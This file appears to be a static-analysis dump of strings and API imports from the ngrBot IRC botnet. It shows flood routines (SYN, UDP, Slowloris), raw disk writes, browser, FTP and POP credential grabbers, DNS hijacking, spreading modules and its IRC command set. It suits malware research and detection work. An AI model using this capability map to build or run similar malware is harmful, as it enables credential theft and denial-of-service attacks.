reference_vaddr	symbol_addr	symbol_type	caller_function	data
0xee964a	0xef29d8	string	0xee9580	POST
0xee967f	0xef2968	string	0xee9580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0xee970b	0xef1180	import	0xee96b0	KERNEL32.dll.HeapFree
0xee9728	0xef10a0	import	0xee96b0	KERNEL32.dll.lstrcpynA
0xee9751	0xef1180	import	0xee96b0	KERNEL32.dll.HeapFree
0xee9770	0xef1174	import	0xee96b0	KERNEL32.dll.GetTickCount
0xee97ba	0xef5f24	string	0xee96b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0xee97f0	0xef5f58	string	0xee96b0	[SYN]: Finished flood on "%s:%d"
0xee981c	0xef1180	import	0xee96b0	KERNEL32.dll.HeapFree
0xee988b	0xef1180	import	0xee9830	KERNEL32.dll.HeapFree
0xee98a8	0xef10a0	import	0xee9830	KERNEL32.dll.lstrcpynA
0xee98d1	0xef1180	import	0xee9830	KERNEL32.dll.HeapFree
0xee98f0	0xef1174	import	0xee9830	KERNEL32.dll.GetTickCount
0xee993a	0xef5ecc	string	0xee9830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0xee9970	0xef5f00	string	0xee9830	[UDP]: Finished flood on "%s:%d"
0xee999c	0xef1180	import	0xee9830	KERNEL32.dll.HeapFree
0xee9a2d	0xef1174	import	0xee99b0	KERNEL32.dll.GetTickCount
0xee9a60	0xef1174	import	0xee99b0	KERNEL32.dll.GetTickCount
0xee9abe	0xef1188	import	0xee99b0	KERNEL32.dll.Sleep
0xee9ae7	0xef1120	import	0xee99b0	KERNEL32.dll.lstrcpyA
0xee9af0	0xef2a08	string	0xee99b0	X-a: b\r\n
0xee9b00	0xef29f0	string	0xee99b0	Connection: Close\r\n\r\n
0xee9b0f	0xef1184	import	0xee99b0	KERNEL32.dll.lstrlenA
0xee9b51	0xef1188	import	0xee99b0	KERNEL32.dll.Sleep
0xee9b5e	0xef1184	import	0xee99b0	KERNEL32.dll.lstrlenA
0xee9b66	0xef1174	import	0xee99b0	KERNEL32.dll.GetTickCount
0xee9b7f	0xef1188	import	0xee99b0	KERNEL32.dll.Sleep
0xee9bd2	0xef1174	import	0xee99b0	KERNEL32.dll.GetTickCount
0xee9be4	0xef1184	import	0xee99b0	KERNEL32.dll.lstrlenA
0xee9c43	0xef1174	import	0xee99b0	KERNEL32.dll.GetTickCount
0xee9c9a	0xef1180	import	0xee9c60	KERNEL32.dll.HeapFree
0xee9cb3	0xef1120	import	0xee9c60	KERNEL32.dll.lstrcpyA
0xee9cc4	0xef10a0	import	0xee9c60	KERNEL32.dll.lstrcpynA
0xee9cf9	0xef5e70	string	0xee9c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0xee9d45	0xef5ea8	string	0xee9c60	[Slowloris]: Finished flood on "%s"
0xee9d73	0xef1180	import	0xee9c60	KERNEL32.dll.HeapFree
0xee9da7	0xef1094	import	0xee9d90	KERNEL32.dll.VirtualAlloc
0xee9dd0	0xef2a14	string	0xee9d90	\\.\PHYSICALDRIVE0
0xee9dd5	0xef1110	import	0xee9d90	KERNEL32.dll.CreateFileA
0xee9e02	0xef1098	import	0xee9d90	KERNEL32.dll.DeviceIoControl
0xee9e21	0xef109c	import	0xee9d90	KERNEL32.dll.SetFilePointer
0xee9e2a	0xef1164	import	0xee9d90	KERNEL32.dll.WriteFile
0xee9e56	0xef109c	import	0xee9d90	KERNEL32.dll.SetFilePointer
0xee9ea2	0xef1098	import	0xee9d90	KERNEL32.dll.DeviceIoControl
0xee9eec	0xef2a28	string	0xee9ec0	00100
0xee9f09	0xef2a14	string	0xee9ec0	\\.\PHYSICALDRIVE0
0xee9f16	0xef1110	import	0xee9ec0	KERNEL32.dll.CreateFileA
0xee9f2b	0xef1098	import	0xee9ec0	KERNEL32.dll.DeviceIoControl
0xee9f5a	0xef1164	import	0xee9ec0	KERNEL32.dll.WriteFile
0xee9f77	0xef1150	import	0xee9ec0	KERNEL32.dll.CloseHandle
0xeea0a2	0xef1158	import	0xeea080	KERNEL32.dll.CreateFileW
0xeea0c0	0xef1164	import	0xeea080	KERNEL32.dll.WriteFile
0xeea0cb	0xef1150	import	0xeea080	KERNEL32.dll.CloseHandle
0xeea0d8	0xef1150	import	0xeea080	KERNEL32.dll.CloseHandle
0xeea184	0xef10c8	import	0xeea150	KERNEL32.dll.GetWindowsDirectoryW
0xeea2ab	0xef1090	import	0xeea260	KERNEL32.dll.CreateProcessW
0xeea2c5	0xef1174	import	0xeea2c0	KERNEL32.dll.GetTickCount
0xeea39f	0xef1184	import	0xeea310	KERNEL32.dll.lstrlenA
0xeea3a8	0xef57b8	string	0xeea310	0a02f70d
0xeea3b0	0xef57b8	string	0xeea310	0a02f70d
0xeea3bb	0xef6944	string	0xeea310	\\.\pipe\%08x_ipc
0xeea3fd	0xef57b8	string	0xeea310	0a02f70d
0xeea40e	0xef57b8	string	0xeea310	0a02f70d
0xeea436	0xef119c	import	0xeea310	KERNEL32.dll.EnterCriticalSection
0xeea452	0xef1110	import	0xeea310	KERNEL32.dll.CreateFileA
0xeea464	0xef1198	import	0xeea310	KERNEL32.dll.LeaveCriticalSection
0xeea484	0xef1164	import	0xeea310	KERNEL32.dll.WriteFile
0xeea48b	0xef1150	import	0xeea310	KERNEL32.dll.CloseHandle
0xeea496	0xef1188	import	0xeea310	KERNEL32.dll.Sleep
0xeea4a1	0xef1198	import	0xeea310	KERNEL32.dll.LeaveCriticalSection
0xeea557	0xef2a48	string	0xeea550	NtShutdownSystem
0xeea55c	0xef16e8	string	0xeea550	ntdll.dll
0xeea57a	0xef1024	import	0xeea550	ADVAPI32.dll.OpenProcessToken
0xeea588	0xef2a34	string	0xeea550	SeShutdownPrivilege
0xeea58f	0xef1028	import	0xeea550	ADVAPI32.dll.LookupPrivilegeValueA
0xeea5b3	0xef102c	import	0xeea550	ADVAPI32.dll.AdjustTokenPrivileges
0xeea5b9	0xef116c	import	0xeea550	KERNEL32.dll.GetLastError
0xeea659	0xef10cc	import	0xeea5d0	KERNEL32.dll.CreateThread
0xeea661	0xef2ad4	string	0xeea5d0	ngrBot Error
0xeea666	0xef2a60	string	0xeea5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0xeea66f	0xef12a4	import	0xeea5d0	USER32.dll.MessageBoxA
0xeea678	0xef10f8	import	0xeea5d0	KERNEL32.dll.WaitForSingleObject
0xeea680	0xef108c	import	0xeea5d0	KERNEL32.dll.ExitProcess
0xeea6df	0xef1238	import	0xeea690	SHELL32.dll.SHGetSpecialFolderPathW
0xeea6ed	0xef1728	string	0xeea690	Internet Explorer\iexplore.exe
0xeea6f9	0xef1240	import	0xeea690	SHLWAPI.dll.PathAppendW
0xeea70a	0xef2af0	string	0xeea690	"%s" %S
0xeea77f	0xef1090	import	0xeea690	KERNEL32.dll.CreateProcessW
0xeea7aa	0xef1174	import	0xeea790	KERNEL32.dll.GetTickCount
0xeea7dc	0xef1188	import	0xeea790	KERNEL32.dll.Sleep
0xeea819	0xef1174	import	0xeea800	KERNEL32.dll.GetTickCount
0xeea859	0xef1188	import	0xeea800	KERNEL32.dll.Sleep
0xeea8b1	0xef1534	string	0xeea880	msnu
0xeea8bd	0xef1330	string	0xeea880	pdef
0xeea8c9	0xef1b04	string	0xeea880	ffgrab
0xeea8d5	0xef1b0c	string	0xeea880	iegrab
0xeea8e1	0xef1a9c	string	0xeea880	ftpgrab
0xeea8ed	0xef1a68	string	0xeea880	popgrab
0xeea8fc	0xef13e4	string	0xeea880	bdns
0xeea908	0xef2b1c	string	0xeea880	usbi
0xeea914	0xef2b14	string	0xeea880	httpi
0xeea946	0xef2b04	string	0xeea880	http
0xeea956	0xef2b04	string	0xeea880	http
0xeea970	0xef2b30	string	0xeea970	DnsFlushResolverCache
0xeea975	0xef2b24	string	0xeea970	dnsapi.dll
0xeea9ed	0xef1090	import	0xeea990	KERNEL32.dll.CreateProcessW
0xeeaa39	0xef29e0	string	0xeeaa10	Mozilla/4.0
0xeeaa45	0xef1120	import	0xeeaa10	KERNEL32.dll.lstrcpyA
0xeeaa60	0xef12b8	import	0xeeaa10	WININET.dll.InternetOpenA
0xeeaa78	0xef1184	import	0xeeaa10	KERNEL32.dll.lstrlenA
0xeeaa8c	0xef12b4	import	0xeeaa10	WININET.dll.InternetOpenUrlA
0xeeaac0	0xef12b0	import	0xeeaa10	WININET.dll.HttpQueryInfoA
0xeeaae2	0xef12ac	import	0xeeaa10	WININET.dll.InternetQueryDataAvailable
0xeeab00	0xef12c8	import	0xeeaa10	WININET.dll.InternetReadFile
0xeeabe7	0xef12c4	import	0xeeaa10	WININET.dll.InternetCloseHandle
0xeeac1a	0xef1178	import	0xeeac00	KERNEL32.dll.HeapAlloc
0xeeac29	0xef12bc	import	0xeeac00	WININET.dll.HttpQueryInfoW
0xeeac44	0xef116c	import	0xeeac00	KERNEL32.dll.GetLastError
0xeeac5e	0xef11a0	import	0xeeac00	KERNEL32.dll.HeapReAlloc
0xeeac80	0xef2b48	string	0xeeac00	POST
0xeeac85	0xef1134	import	0xeeac00	KERNEL32.dll.lstrcmpW
0xeeac99	0xef1180	import	0xeeac00	KERNEL32.dll.HeapFree
0xeeacb2	0xef1180	import	0xeeac00	KERNEL32.dll.HeapFree
0xeead0a	0xef1178	import	0xeeacd0	KERNEL32.dll.HeapAlloc
0xeead1a	0xef12c0	import	0xeeacd0	WININET.dll.InternetQueryOptionW
0xeead31	0xef116c	import	0xeeacd0	KERNEL32.dll.GetLastError
0xeead4f	0xef11a0	import	0xeeacd0	KERNEL32.dll.HeapReAlloc
0xeead80	0xef112c	import	0xeeacd0	KERNEL32.dll.WideCharToMultiByte
0xeeadb3	0xef1120	import	0xeeacd0	KERNEL32.dll.lstrcpyA
0xeeade6	0xef1180	import	0xeeacd0	KERNEL32.dll.HeapFree
0xeeae05	0xef1184	import	0xeeae00	KERNEL32.dll.lstrlenA
0xeeae13	0xef1178	import	0xeeae00	KERNEL32.dll.HeapAlloc
0xeeae69	0xef1120	import	0xeeae00	KERNEL32.dll.lstrcpyA
0xeeae7f	0xef1088	import	0xeeae00	KERNEL32.dll.lstrcatA
0xeeaed5	0xef1180	import	0xeeae00	KERNEL32.dll.HeapFree
0xeeaeeb	0xef1180	import	0xeeae00	KERNEL32.dll.HeapFree
0xeeaf58	0xef1120	import	0xeeae00	KERNEL32.dll.lstrcpyA
0xeeaf70	0xef1180	import	0xeeae00	KERNEL32.dll.HeapFree
0xeeafaf	0xef1184	import	0xeeafa0	KERNEL32.dll.lstrlenA
0xeeafcb	0xef1178	import	0xeeafa0	KERNEL32.dll.HeapAlloc
0xeeb024	0xef2b88	string	0xeeafa0	POST /%1023s
0xeeb055	0xef2b7c	string	0xeeafa0	Host:
0xeeb08e	0xef10a0	import	0xeeafa0	KERNEL32.dll.lstrcpynA
0xeeb0d5	0xef1178	import	0xeeafa0	KERNEL32.dll.HeapAlloc
0xeeb0e3	0xef2b74	string	0xeeafa0	HTTP
0xeeb0ff	0xef2b68	string	0xeeafa0	http://%s/
0xeeb11e	0xef2b58	string	0xeeafa0	http://%s/%s
0xeeb13c	0xef1180	import	0xeeafa0	KERNEL32.dll.HeapFree
0xeeb16a	0xef1184	import	0xeeb160	KERNEL32.dll.lstrlenA
0xeeb186	0xef1178	import	0xeeb160	KERNEL32.dll.HeapAlloc
0xeeb199	0xef2b98	string	0xeeb160	\r\n\r\n
0xeeb1d2	0xef1178	import	0xeeb160	KERNEL32.dll.HeapAlloc
0xeeb1e5	0xef10a0	import	0xeeb160	KERNEL32.dll.lstrcpynA
0xeeb1f8	0xef1180	import	0xeeb160	KERNEL32.dll.HeapFree
0xeeb2ee	0xeeb2b0	string	0xeeb290	<%u2
0xeeb312	0xef117c	import	0xeeb300	KERNEL32.dll.GetProcessHeap
0xeeb319	0xef1178	import	0xeeb300	KERNEL32.dll.HeapAlloc
0xeeb366	0xef2bb4	string	0xeeb300	lol.exe
0xeeb387	0xef10c8	import	0xeeb300	KERNEL32.dll.GetWindowsDirectoryW
0xeeb3a1	0xef10b8	import	0xeeb300	KERNEL32.dll.lstrcpynW
0xeeb3bb	0xef1084	import	0xeeb300	KERNEL32.dll.GetVolumeInformationW
0xeeb3cd	0xef1184	import	0xeeb300	KERNEL32.dll.lstrlenA
0xeeb3d3	0xef57b8	string	0xeeb300	0a02f70d
0xeeb3ea	0xef57b8	string	0xeeb300	0a02f70d
0xeeb45b	0xef2ba0	string	0xeeb300	.exe
0xeeb461	0xef10bc	import	0xeeb300	KERNEL32.dll.lstrcatW
0xeeb4a9	0xef2c18	string	0xeeb480	isadmin
0xeeb4ae	0xef2c10	string	0xeeb480	admin
0xeeb4fe	0xef1120	import	0xeeb480	KERNEL32.dll.lstrcpyA
0xeeb536	0xef1178	import	0xeeb480	KERNEL32.dll.HeapAlloc
0xeeb550	0xef10d8	import	0xeeb480	KERNEL32.dll.GetVersionExA
0xeeb60d	0xef1178	import	0xeeb480	KERNEL32.dll.HeapAlloc
0xeeb620	0xef6928	string	0xeeb480	http://api.wipmania.com/
0xeeb63b	0xef2be8	string	0xeeb480	<br>
0xeeb650	0xef1184	import	0xeeb480	KERNEL32.dll.lstrlenA
0xeeb65f	0xef1184	import	0xeeb480	KERNEL32.dll.lstrlenA
0xeeb67d	0xef1080	import	0xeeb480	KERNEL32.dll.GetLocaleInfoA
0xeeb6a8	0xef1128	import	0xeeb480	KERNEL32.dll.lstrcmpA
0xeeb6c5	0xef1080	import	0xeeb480	KERNEL32.dll.GetLocaleInfoA
0xeeb6f9	0xef1080	import	0xeeb480	KERNEL32.dll.GetLocaleInfoA
0xeeb741	0xef1178	import	0xeeb480	KERNEL32.dll.HeapAlloc
0xeeb7f1	0xef2bd0	string	0xeeb480	n%s{%s|%s%s}%s
0xeeb80b	0xef2bc4	string	0xeeb480	{%s|%s%s}%s
0xeeb8be	0xef2bd0	string	0xeeb480	n%s{%s|%s%s}%s
0xeeb8d5	0xef2bc4	string	0xeeb480	{%s|%s%s}%s
0xeeb94b	0xef2c20	string	0xeeb900	127.0.0.1
0xeeb975	0xef1188	import	0xeeb900	KERNEL32.dll.Sleep
0xeeb9bc	0xef119c	import	0xeeb990	KERNEL32.dll.EnterCriticalSection
0xeeb9d1	0xef12a0	import	0xeeb990	USER32.dll.wvsprintfA
0xeeb9f2	0xef1198	import	0xeeb990	KERNEL32.dll.LeaveCriticalSection
0xeeba42	0xef12a0	import	0xeeba00	USER32.dll.wvsprintfA
0xeeba56	0xef5d8c	string	0xeeba00	PRIVMSG %s :%s\r\n
0xeeba7f	0xef5c94	string	0xeeba70	PASS %s\r\n
0xeeba9c	0xef5d64	string	0xeeba70	NICK %s\r\n
0xeebab4	0xef5d50	string	0xeeba70	USER %s 0 0 :%s\r\n
0xeebb52	0xef1184	import	0xeebb30	KERNEL32.dll.lstrlenA
0xeebba0	0xef1128	import	0xeebb80	KERNEL32.dll.lstrcmpA
0xeebbff	0xef1128	import	0xeebbb0	KERNEL32.dll.lstrcmpA
0xeebc10	0xef5818	string	0xeebbb0	version
0xeebc2c	0xef57b8	string	0xeebbb0	0a02f70d
0xeebc31	0xef57b0	string	0xeebbb0	1.1.0.0
0xeebc36	0xef5dc8	string	0xeebbb0	[v="%s" c="%s" h="%s" p="%S"]
0xeebc89	0xef2cf4	string	0xeebbb0	reconnecting
0xeebc8e	0xef5da0	string	0xeebbb0	QUIT :%s\r\n
0xeebcc3	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeebce1	0xef1180	import	0xeebbb0	KERNEL32.dll.HeapFree
0xeebcec	0xef2cf4	string	0xeebbb0	reconnecting
0xeebcf1	0xef5da0	string	0xeebbb0	QUIT :%s\r\n
0xeebd18	0xef57f8	string	0xeebbb0	mata
0xeebd28	0xef2ce8	string	0xeebbb0	exiting
0xeebd2d	0xef5da0	string	0xeebbb0	QUIT :%s\r\n
0xeebd4a	0xef5800	string	0xeebbb0	l1mpia
0xeebd5a	0xef2cdc	string	0xeebbb0	removing
0xeebd5f	0xef5da0	string	0xeebbb0	QUIT :%s\r\n
0xeebd7c	0xef5834	string	0xeebbb0	pais
0xeebdb2	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebdc6	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeebdd5	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeebe0c	0xef2ccc	string	0xeebbb0	#new
0xeebe18	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebe2a	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeebe72	0xef2cbc	string	0xeebbb0	#admin
0xeebe79	0xef2cb4	string	0xeebbb0	#user
0xeebe7f	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebe91	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeebecb	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebed1	0xef57b0	string	0xeebbb0	1.1.0.0
0xeebee7	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebefa	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeebf0c	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeebf5f	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebf73	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeebf82	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeebfa6	0xef2ccc	string	0xeebbb0	#new
0xeebfb2	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeebfc4	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeec00c	0xef2cbc	string	0xeebbb0	#admin
0xeec013	0xef2cb4	string	0xeebbb0	#user
0xeec019	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec02b	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeec065	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec06b	0xef57b0	string	0xeebbb0	1.1.0.0
0xeec081	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec094	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeec0a6	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeec0c3	0xef58b4	string	0xeebbb0	stop
0xeec0e3	0xef5880	string	0xeebbb0	stats
0xeec124	0xef6094	string	0xeebbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0xeec156	0xef60c0	string	0xeebbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0xeec192	0xef6094	string	0xeebbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0xeec1b9	0xef60c0	string	0xeebbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0xeec1d2	0xef5890	string	0xeebbb0	logins
0xeec225	0xef1180	import	0xeebbb0	KERNEL32.dll.HeapFree
0xeec25e	0xef2c88	string	0xeebbb0	[Logins]: Cleared %d logins
0xeec283	0xef2c80	string	0xeebbb0	%s|%s
0xeec2c2	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec2d2	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeec2ea	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec321	0xef6110	string	0xeebbb0	[RSOCK4]: Stopped rsock4
0xeec33f	0xef5888	string	0xeebbb0	speed
0xeec354	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec3cc	0xef5808	string	0xeebbb0	mudo
0xeec3fd	0xef5824	string	0xeebbb0	move
0xeec449	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeec477	0xef57b0	string	0xeebbb0	1.1.0.0
0xeec4bf	0xef5d70	string	0xeebbb0	JOIN %s %s\r\n
0xeec4dc	0xef582c	string	0xeebbb0	p4rt
0xeec532	0xef57b0	string	0xeebbb0	1.1.0.0
0xeec550	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeec572	0xef5d80	string	0xeebbb0	PART %s\r\n
0xeec58f	0xef57e8	string	0xeebbb0	baja
0xeec5d0	0xef1330	string	0xeebbb0	pdef
0xeec5e2	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec5f7	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeec60e	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec61f	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec633	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeec642	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeec679	0xef1330	string	0xeebbb0	pdef
0xeec68f	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec6aa	0xef5840	string	0xeebbb0	msn.set
0xeec6d0	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec6e0	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec706	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeec73d	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec743	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec77e	0xef14f8	string	0xeebbb0	msnmsg
0xeec7ce	0xef5f90	string	0xeebbb0	[MSN]: Updated MSN spread message to "%s"
0xeec7e7	0xef5848	string	0xeebbb0	msn.int
0xeec826	0xef1500	string	0xeebbb0	msnint
0xeec859	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec876	0xef5fbc	string	0xeebbb0	[MSN]: Updated MSN spread interval to "%s"
0xeec88f	0xef5850	string	0xeebbb0	http.set
0xeec8b5	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec8d0	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeec8f5	0xef1088	import	0xeebbb0	KERNEL32.dll.lstrcatA
0xeec92c	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeec955	0xef2b04	string	0xeebbb0	http
0xeec972	0xef5fe8	string	0xeebbb0	[HTTP]: Updated HTTP spread message to "%s"
0xeec97f	0xef585c	string	0xeebbb0	http.int
0xeec9c0	0xef2b04	string	0xeebbb0	http
0xeec9df	0xef6038	string	0xeebbb0	[HTTP]: Updated HTTP spread interval to "%s"
0xeec9f8	0xef5868	string	0xeebbb0	http.inj
0xeeca16	0xef2b14	string	0xeebbb0	httpi
0xeeca26	0xef2c70	string	0xeebbb0	enabled
0xeeca2b	0xef6014	string	0xeebbb0	[HTTP]: Injected value is now %s.
0xeeca43	0xef2b14	string	0xeebbb0	httpi
0xeeca53	0xef2c64	string	0xeebbb0	disabled
0xeeca58	0xef6014	string	0xeebbb0	[HTTP]: Injected value is now %s.
0xeeca71	0xef5878	string	0xeebbb0	chdns
0xeeca9f	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeecadd	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeecaf3	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeecb36	0xef13e4	string	0xeebbb0	bdns
0xeecb56	0xef2c44	string	0xeebbb0	[DNS]: Redirecting "%s" to "%s"
0xeecb76	0xef13e4	string	0xeebbb0	bdns
0xeecb7b	0xef13dc	string	0xeebbb0	block
0xeecb95	0xef6080	string	0xeebbb0	[DNS]: Blocked "%s"
0xeecbb8	0xef5810	string	0xeebbb0	v1sit
0xeecbf4	0xef6068	string	0xeebbb0	[Visit]: Visited "%s"
0xeecc0a	0xef62bc	string	0xeebbb0	[Visit]: Error visitng "%s"
0xeecc23	0xef57f0	string	0xeebbb0	updt
0xeecc3a	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeecc8b	0xef2c34	string	0xeebbb0	%s|%s|%s
0xeecca8	0xef2c80	string	0xeebbb0	%s|%s
0xeeccd4	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeecce4	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeecd11	0xef58a0	string	0xeebbb0	slow
0xeecd27	0xef2c80	string	0xeebbb0	%s|%s
0xeecd47	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeecd58	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeecd70	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeecdfc	0xef1534	string	0xeebbb0	msnu
0xeece55	0xef1330	string	0xeebbb0	pdef
0xeece66	0xef1b04	string	0xeebbb0	ffgrab
0xeece7b	0xef1b0c	string	0xeebbb0	iegrab
0xeece8c	0xef1a9c	string	0xeebbb0	ftpgrab
0xeece9d	0xef1a68	string	0xeebbb0	popgrab
0xeeceb2	0xef13e4	string	0xeebbb0	bdns
0xeecec7	0xef2b1c	string	0xeebbb0	usbi
0xeecf67	0xef60ec	string	0xeebbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0xeecfe3	0xef2c34	string	0xeebbb0	%s|%s|%s
0xeed003	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeed013	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeed02b	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeed043	0xef58a8	string	0xeebbb0	ssyn
0xeed097	0xef2c34	string	0xeebbb0	%s|%s|%s
0xeed0b7	0xef1184	import	0xeebbb0	KERNEL32.dll.lstrlenA
0xeed0c8	0xef1178	import	0xeebbb0	KERNEL32.dll.HeapAlloc
0xeed0dc	0xef1120	import	0xeebbb0	KERNEL32.dll.lstrcpyA
0xeed0f0	0xef10cc	import	0xeebbb0	KERNEL32.dll.CreateThread
0xeed0f7	0xef1150	import	0xeebbb0	KERNEL32.dll.CloseHandle
0xeed145	0xef1128	import	0xeed110	KERNEL32.dll.lstrcmpA
0xeed18c	0xef10a0	import	0xeed110	KERNEL32.dll.lstrcpynA
0xeed198	0xef1184	import	0xeed110	KERNEL32.dll.lstrlenA
0xeed231	0xef1184	import	0xeed220	KERNEL32.dll.lstrlenA
0xeed243	0xef2d18	string	0xeed220	MOTD
0xeed2b5	0xef1128	import	0xeed220	KERNEL32.dll.lstrcmpA
0xeed2bb	0xef5db8	string	0xeed220	PING
0xeed2d1	0xef5dac	string	0xeed220	PONG %s\r\n
0xeed308	0xef5d70	string	0xeed220	JOIN %s %s\r\n
0xeed33c	0xef5d64	string	0xeed220	NICK %s\r\n
0xeed351	0xef18c4	string	0xeed220	JOIN
0xeed38d	0xef5dc0	string	0xeed220	PRIVMSG
0xeed44a	0xef5d70	string	0xeed220	JOIN %s %s\r\n
0xeed5dd	0xef18d0	string	0xeed540	%s:%d
0xeed5f4	0xef1188	import	0xeed540	KERNEL32.dll.Sleep
0xeed669	0xef1188	import	0xeed540	KERNEL32.dll.Sleep
0xeed70d	0xef1018	import	0xeed6c0	ADVAPI32.dll.RegCreateKeyExW
0xeed741	0xef1000	import	0xeed6c0	ADVAPI32.dll.RegSetValueExW
0xeed750	0xef1020	import	0xeed6c0	ADVAPI32.dll.RegCloseKey
0xeed763	0xef1020	import	0xeed6c0	ADVAPI32.dll.RegCloseKey
0xeed7c2	0xef1178	import	0xeed7b0	KERNEL32.dll.HeapAlloc
0xeed81b	0xef1180	import	0xeed7b0	KERNEL32.dll.HeapFree
0xeed829	0xef1180	import	0xeed7b0	KERNEL32.dll.HeapFree
